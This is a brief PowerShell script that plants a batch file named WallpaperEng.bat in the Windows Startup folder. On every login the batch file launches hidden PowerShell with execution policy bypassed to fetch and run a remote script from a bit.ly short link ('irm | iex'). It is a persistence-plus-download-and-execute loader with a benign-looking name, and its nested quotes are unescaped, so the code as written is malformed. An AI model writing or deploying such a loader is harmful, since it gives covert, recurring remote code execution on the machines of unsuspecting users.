#Creates .bat file that calls to ps online

$batContent = "@echo off
timeout /t 5
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm bit.ly/kill-wallpaper | iex"

cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

Set-Content -Path WallpaperEng.bat -Value $batContent -Encoding ASCII
